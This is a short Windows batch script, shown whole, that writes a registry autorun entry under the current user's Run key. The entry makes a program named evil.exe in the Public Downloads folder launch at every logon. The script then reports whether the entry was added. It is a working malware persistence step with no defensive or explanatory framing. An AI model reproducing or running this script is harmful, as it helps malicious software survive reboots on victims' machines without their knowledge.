@echo off
setlocal
set ProgramPath=C:\Users\Public\Downloads\evil.exe
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyProgramName /t REG_SZ /d "%ProgramPath%" /f
if %errorlevel% == 0 (
    echo Successfully added to autorun.
) else (
    echo Failed to add to autorun.
)
endlocal
exit